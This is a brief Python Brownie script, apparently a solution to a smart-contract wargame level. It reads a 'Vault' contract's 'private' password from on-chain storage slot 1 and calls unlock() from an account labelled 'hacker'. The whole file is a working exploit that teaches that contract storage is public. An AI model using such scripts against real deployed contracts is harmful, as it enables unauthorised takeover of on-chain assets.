from brownie import web3, accounts, config, interface, convert, Vault

def main():
    contract = '0x5d88e935ABdaB441563f26EACb88CC2B4f00Dde5'

    hacker = accounts.add(config['wallets']['from_key'])
    locked = web3.eth.get_storage_at(contract, 0)

    vault_interface  = interface.IVault(contract)

    print(f'Locked: {convert.to_bool(locked)}')
    password = web3.eth.get_storage_at(contract, 1)
    print(password)


    unlock = vault_interface.unlock(password, {'from': hacker})
    unlock.wait(1)
    locked = web3.eth.get_storage_at(contract, 0)
    print(f'Locked: {convert.to_bool(locked)}')
